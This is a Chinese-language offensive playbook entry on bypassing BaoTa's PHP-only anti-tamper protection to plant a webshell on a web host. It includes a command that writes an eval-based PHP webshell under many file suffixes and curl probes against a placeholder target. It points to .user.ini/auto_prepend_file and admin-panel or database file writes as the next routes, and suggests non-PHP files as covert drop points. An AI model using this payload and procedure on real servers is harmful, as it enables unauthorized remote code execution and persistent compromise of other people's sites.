## 描述

在宝塔环境里，站点 docroot 常有「网站防篡改」只保护 .php。实测结论（用于快速判死，避免后人重复投入）：
① 只有 `.php` 被拦：`file_put_contents` 到 .php 返回 false，`copy()`/`rename()` 到 .php 也 false，`link()`（硬链接）到 .php 同样 false。而 `.php5/.php7/.phtml/.pht/.phar/.inc/.txt/.shtml→FAIL/.module/.cgi/.pl/.asp/.aspx/.user.ini` 全部可写成功。
② 但这些替代后缀**不被 nginx 交给 FPM 执行**：GET 它们返回**源码原文**（Content-Length 与文件等长），POST 它们返回 nginx **405 Not Allowed**（静态文件不收 POST）。
③ 因此「换个后缀绕过防篡改」在本环境下**不能得到 webshell 入口**，只能得到公开可读的源码泄露面。要落马必须走 `.user.ini + auto_prepend_file`（或拿到后台/DB 写文件能力）。

## 用法

```
用途一：判断能否在目标落 PHP 文件 —— 先跑后缀写入矩阵
  c=$a="<?php @eval(\$_POST[0]);?>";foreach(array("php","php5","php7","phtml","pht","phar","inc","txt","shtml","module","cgi","pl","asp","aspx","user.ini","php.txt","php.","PHP") as $e){echo $e." => ".var_export(@file_put_contents("../data/zz.".$e,$a),true)."\n";}
用途二：判断替代后缀是否真被解析（关键：看 POST 是否 405）
  curl -k -d "0=echo 'OK';" "https://TARGET/data/zz.phtml"   # 405 = nginx 当静态文件，未解析；echo 出 OK 才是解析
  curl -k    "https://TARGET/data/zz.phtml"                   # 返回 <?php 源码原文 = 未解析
判死规则：.php 写入 false + 替代后缀 POST 405 ⇒ 换后缀路线作废，直接转 .user.ini / 后台 / DB 写文件。
附带利用：非 .php 后缀写进去的内容会被 nginx 原样当静态文件吐出 ⇒ 可作为「稳定可读的文件投放点」（投递配置、落地标记、跨会话传数据）。
```
